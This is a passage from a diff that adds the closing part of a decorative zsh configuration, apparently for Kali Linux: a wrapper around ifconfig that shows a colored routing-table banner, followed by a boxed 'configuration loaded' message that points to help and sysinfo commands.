+        echo -e "\e[36m║\e[32m              🌐  ROUTING TABLE\e[36m                        ║\e[0m"
+        echo -e "\e[36m╚═══════════════════════════════════════════════════════╝\e[0m"
+        /sbin/ip -c route show
+    else
+        command ifconfig "$@"
+    fi
+}
+
+# ╭───────────────────────────────────────────────────────────────────────────╮
+# │ ✨ FINAL MESSAGE                                                          │
+# ╰───────────────────────────────────────────────────────────────────────────╯
+
+echo -e "\e[32m╭───────────────────────────────────────────────────────────╮\e[0m"
+echo -e "\e[32m│\e[36m  ✓ Kali Ultra ZSH Configuration Loaded Successfully\e[32m     │\e[0m"
+echo -e "\e[32m│\e[33m  💡 Type '\e[35mhelp\e[33m' for available commands\e[32m                    │\e[0m"
+echo -e "\e[32m│\e[33m  📊 Type '\e[35msysinfo\e[33m' for system information\e[32m                 │\e[0m"
+echo -e "\e[32m╰───────────────────────────────────────────────────────────╯\e[0m"
